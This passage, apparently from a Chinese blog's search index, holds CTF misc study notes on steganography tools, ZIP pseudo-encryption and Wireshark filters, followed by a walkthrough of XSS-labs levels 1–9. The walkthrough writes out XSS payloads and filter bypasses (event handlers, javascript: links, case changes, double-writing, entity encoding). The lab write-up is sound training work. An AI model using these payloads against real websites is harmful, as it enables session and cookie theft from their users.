href="https://blog.csdn.net/ismismist/article/details/123535578">IHDR信息</a></td></tr><tr><td>GIF</td><td>文件结尾为0x3B</td></tr></tbody></table><h2 id="二、文件分离"><a href="#二、文件分离" class="headerlink" title="二、文件分离"></a>二、文件分离</h2><p><strong>binwalk</strong></p><p>binwalk可以快速分辨文件是否由多个文件合并而成，并将文件进行分离，分离成功会在目标文件的目录下生成一个形如**_文件名_extracted**的文件目录，目录中有分离后的文件。</p><p>binwalk在kali里是自带的，想在window使用可以参考此教程<a href="https://blog.csdn.net/Goodric/article/details/117845492">传送门</a></p><h3 id="简单操作教程"><a href="#简单操作教程" class="headerlink" title="简单操作教程"></a>简单操作教程</h3><p><strong>文件分析：</strong>binwalk 文件名</p><p><strong>文件分离：</strong>binwalk -e 文件名</p><p>详细操作教程<a href="https://blog.csdn.net/qq_50854790/article/details/123391951?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-123391951-blog-123426905.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-123391951-blog-123426905.pc_relevant_aa&utm_relevant_index=1">传送门</a></p><p><strong>foremost</strong></p><p>如果binwalk无法正确分离出文件，可用使用foremost。</p><p>foremost在kali已预装载</p><p><strong>文件分离：</strong>foremost 文件名 -o 输出文件名</p><h2 id="三、盲水印"><a href="#三、盲水印" class="headerlink" title="三、盲水印"></a>三、盲水印</h2><p>盲水印是利用二维傅里叶变换，给文件添加肉眼无法直接看到的水印数据。</p><p>盲水印不仅仅用于图片，也可应用于像音频这种数据流</p><p><strong>当出现两张看起来一模一样的图片，可以用盲水印解密工具来尝试。</strong></p><h3 id="BlindWaterMark工具"><a href="#BlindWaterMark工具" class="headerlink" title="BlindWaterMark工具"></a>BlindWaterMark工具</h3><p>工具下载<a href="https://github.com/chishaxie/BlindWaterMark">传送门</a></p><p><strong>合成盲水印：</strong>python3 bwmforpy3.py encode 原图 信息文件 盲水印图片</p><p><strong>提取盲水印：</strong>python3 bwmforpy3.py decode 原图 盲水印图片 信息文件</p><p>详细操作教程<a href="https://hetian.blog.csdn.net/article/details/122572238?spm=1001.2101.3001.6650.15&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-15-122572238-blog-82847756.pc_relevant_multi_platform_whitelistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-15-122572238-blog-82847756.pc_relevant_multi_platform_whitelistv1&utm_relevant_index=18">传送门</a></p><h2 id="四、音频隐写"><a href="#四、音频隐写" class="headerlink" title="四、音频隐写"></a>四、音频隐写</h2><p>详细可以参考此文章<a href="https://blog.csdn.net/qq_51652400/article/details/123504708">传送门</a></p><h3 id="推荐工具"><a href="#推荐工具" class="headerlink" title="推荐工具"></a>推荐工具</h3><p><strong>MP3stego</strong></p><p>工具下载<a href="https://www.petitcolas.net/steganography/mp3stego">传送门</a></p><p><strong>加密：</strong> encode -E 加密的txt文件名 -P pass 加密的wav文件名 输出的mp3文件名</p><p><strong>解密：</strong>decode -X -P pass MP3文件名</p><h2 id="五、伪加密"><a href="#五、伪加密" class="headerlink" title="五、伪加密"></a>五、伪加密</h2><p>一个ZIP文件由三部分组成：</p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标准</p><ul><li><p><strong>无加密</strong>：压缩源文件数据区的全局加密应当为00 00，且压缩源文件目录区的全局方式位标记应当为00 00</p></li><li><p><strong>真加密：</strong>压缩源文件数据区的全局加密应当为09（或奇数） 00，且压缩源文件目录区的全局方式位标记应当为09（或奇数） 00</p></li><li><p><strong>伪加密：</strong>压缩源文件数据区的全局加密应当为00（或其他数） 00，且压缩源文件目录区的全局方式位标记应当为09（或奇数） 00</p></li></ul><h2 id="六、图片隐写"><a href="#六、图片隐写" class="headerlink" title="六、图片隐写"></a>六、图片隐写</h2><h3 id="常见的图片隐写方式："><a href="#常见的图片隐写方式：" class="headerlink" title="常见的图片隐写方式："></a>常见的图片隐写方式：</h3><p>摘自：<a href="https://zhuanlan.zhihu.com/p/467859047">传送门</a></p><p>1.修改数据（png图片用winhex或者是010工具打开后，可以看到第二行前四个数据是高，后四个数据是宽。一般需要修改这两组数据来获得完整的图片）</p><p>2.图片的属性，详细信息中含有flag或者是含有密码，可以通过解密工具进行解密。</p><p>3.图片中含有另一张图，这时最简单的方法是使用<a href="https://github.com/korczis/foremost">foremost</a>工具进行图片的分离</p><p>4.通过查看一个文件的文件头含有：<strong>data:image&#x2F;png;base64，这就属于png图片格式，</strong>真正的base64编码是前缀之后的那些数据，然后就可以利用base64转图片进行操作（base64比较常用，但还是具体问题具体分析）</p><p>5.修改文件的后缀名：如将txt文件修改为jpg文件或者是png文件；有些题目需要将所有的文件名修改为png或jpg文件名后缀，然后拼接成为一个完整的flag</p><p>……</p><h3 id="推荐工具："><a href="#推荐工具：" class="headerlink" title="推荐工具："></a>推荐工具：</h3><p><strong>OutGuess</strong></p><p>下载（kali）教程<a href="https://blog.csdn.net/m0_58199719/article/details/123692511">传送门</a></p><p><strong>隐藏文件：</strong>outguess -k 秘钥 -d 隐藏文件 原始图片 加密后的图片</p><p><strong>提取文件：</strong>outguess -k 秘钥 -r 加密后的图片 输出文件名</p><h2 id="七、流量分析"><a href="#七、流量分析" class="headerlink" title="七、流量分析"></a>七、流量分析</h2><h3 id="IP筛选"><a href="#IP筛选" class="headerlink" title="IP筛选"></a>IP筛选</h3><table><thead><tr><th>ip.src &#x3D;&#x3D; 地址</th><th>源ip筛选</th></tr></thead><tbody><tr><td>ip.dst &#x3D;&#x3D; 地址</td><td>目的ip筛选</td></tr><tr><td>ip.addr &#x3D;&#x3D; 地址</td><td>ip筛选</td></tr></tbody></table><h3 id="MAC地址筛选"><a href="#MAC地址筛选" class="headerlink" title="MAC地址筛选"></a>MAC地址筛选</h3><table><thead><tr><th>eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84</th><th>目标mac地址筛选</th></tr></thead><tbody><tr><td>eth.addr</td><td>mac地址筛选</td></tr></tbody></table><h3 id="端口筛选"><a href="#端口筛选" class="headerlink" title="端口筛选"></a>端口筛选</h3><table><thead><tr><th>tcp.dstport &#x3D;&#x3D; 80</th><th>筛选tcp协议的目标端口为80的流量包</th></tr></thead><tbody><tr><td>tcp.srcport &#x3D;&#x3D; 80</td><td>筛选tcp协议的源端口为80的流量包</td></tr><tr><td>udp.srcport &#x3D;&#x3D; 80</td><td>筛选udp协议的源端口为80的流量包</td></tr></tbody></table><h3 id="协议筛选"><a href="#协议筛选" class="headerlink" title="协议筛选"></a>协议筛选</h3><table><thead><tr><th>tcp</th><th>筛选协议为tcp的流量包</th></tr></thead><tbody><tr><td>udp</td><td>筛选协议为udp的流量包</td></tr><tr><td>arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip</td><td>筛选协议为arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip的流量包</td></tr></tbody></table><p><strong>注：可用！加协议名或者not加协议名表示排除该协议</strong></p><h3 id="流量包的修复"><a href="#流量包的修复" class="headerlink" title="流量包的修复"></a>流量包的修复</h3><p>通过在线pacp包修复工具进行修复 <a href="http://f00l.de/hacking/pcapfix.php">传送门</a></p><p><strong>才疏学浅、粗略总结，如有不足和错误，还望各位大师傅们帮忙指正:)！！！</strong></p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS-labs靶场练题记录</title>
    <link href="/2022/06/27/xss/"/>
    <url>/2022/06/27/xss/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS靶场练题记录"><a href="#XSS靶场练题记录" class="headerlink" title="XSS靶场练题记录"></a>XSS靶场练题记录</h1><h2 id="XSS攻击："><a href="#XSS攻击：" class="headerlink" title="XSS攻击："></a><strong>XSS攻击：</strong></h2><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容</p><h2 id="XSS靶场地址："><a href="#XSS靶场地址：" class="headerlink" title="XSS靶场地址："></a><strong>XSS靶场地址：</strong></h2><p><a href="">传送门</a></p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://blog.csdn.net/qq_58784379/article/details/119564213">传送门</a></p><h2 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a><strong>解题过程</strong>：</h2><h3 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h3><p>右键获得源码，对源码进行分析可知，当<a href="https://www.runoob.com/jsref/met-win-alert.html">弹窗alert</a>被执行后，则输出”完成的不错！”并跳转到Level2。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level1<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎用户test<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level1.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:4<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>﻿<br></code></pre></td></tr></table></figure><h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><p>构建alert()提交后发现没有弹窗，右键查看源码发现&lt;&gt;被过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但在value处未被过滤，所以闭合value标签，再执行。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><p>构建alert()提交后发现没有弹窗，右键查看源码发现value处的&lt;&gt;也被过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>于是构造<a href="https://www.runoob.com/jsref/event-onclick.html">事件</a>，此处构造代码为：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27; onclick=alert() &#x27;<br></code></pre></td></tr></table></figure><p>提交后点击输入框则弹出弹窗。</p><p>PS：经王师傅提示，使用onmouseover构造更加方便。</p><h3 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h3><p>构造提交后右键查看源代码发现依旧是&lt;&gt;被过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level4.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;scriptalert()/script&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>模仿Level3构建事件，点击输入框弹出弹窗。</p><h3 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h3><p>尝试构造后发现，题目直接在我的<script>中添加下划线进行过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert()<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;scr_ipt&gt;alert()&lt;/script&gt;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>同时构造事件也被同样的方式过滤，最后构造javascript语句弹出成功。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; /&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span><br></code></pre></td></tr></table></figure><p>PS： " />是确保前面的内容闭合。</p><h3 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h3><p>尝试Level5中的方法失败了，查看源代码发现herf被过滤了。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level6<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;quot;</span> /<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a href=javascript:alert()<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level6.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hr_ef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>&quot;&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>于是构造大写来绕过。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; /&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hrEf</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h3><p>构造后发现直接将<>内的script给删除了，大小写无法规避。</p><p>尝试双写script后成功。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">scrscriptipt</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">scrscriptipt</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h3><p>当我们输入内容的时候，value的内容会直接带入href，点击友情链接的时候，就会执行带入的参数。</p><p>尝试使用javascript:alert()发现存在过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level8.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;javascript:alert()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">添加友情链接</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascr_ipt:alert()&quot;</span>&gt;</span>友情链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level8.jpg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:19<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里对script进行HTML实体编码。</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">HTML实体编码在线转换</a></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">java&amp;<span class="hljs-attr">#115</span>;&amp;<span class="hljs-attr">#99</span>;&amp;<span class="hljs-attr">#114</span>;&amp;<span class="hljs-attr">#105</span>;&amp;<span class="hljs-attr">#112</span>;&amp;<span class="hljs-attr">#116</span>;:alert<span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><h3 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h3><p>输入提示内容非法，判断其对协议进行检测。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level9.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;java<span class="hljs-symbol">&amp;amp;</span>#115;<span class="hljs-symbol">&amp;amp;</span>#99;<span class="hljs-symbol">&amp;amp;</span>#114;<span class="hljs-symbol">&amp;amp;</span>#105;<span class="hljs-symbol">&amp;amp;</span>#112;<span class="hljs-symbol">&amp;amp;</span>#116;:alert()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">添加友情链接</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;您的链接不合法？有没有！&quot;</span>&gt;</span>友情链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level9.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:47<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>声明http://协议，同时对其进行注释，使其能够通过检测同时不影响javascript:alert()的执行。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">java&amp;<span class="hljs-attr">#115</span>;&amp;<span class="hljs-attr">#99</span>;&amp;<span class="hljs-attr">#114</span>;&amp;<span class="hljs-attr">#105</span>;&amp;<span class="hljs-attr">#112</span>;&amp;<span class="hljs-attr">#116</span>;:alert<span class="hljs-comment">()</span><span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>XSS</tag>
      
      <tag>XSSlabs</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
